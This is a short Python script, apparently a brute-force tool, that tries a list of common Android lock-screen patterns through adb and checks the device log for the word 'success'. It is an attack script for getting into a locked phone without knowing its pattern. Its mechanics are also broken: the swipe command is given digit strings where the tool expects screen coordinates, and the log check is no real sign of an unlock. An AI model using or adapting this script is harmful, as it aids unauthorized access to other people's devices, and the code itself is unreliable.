import os
patterns = ["12369","14789","1235789","123654789","123698745","456852","159357"]

for pattern in patterns:
    os.system(f"adb shell input swipe {pattern}")
    if "success" in os.popen("adb logcat -d").read():
        print(f"[SUCCESS] Pattern: {pattern}")
        exit(0)
exit(1)
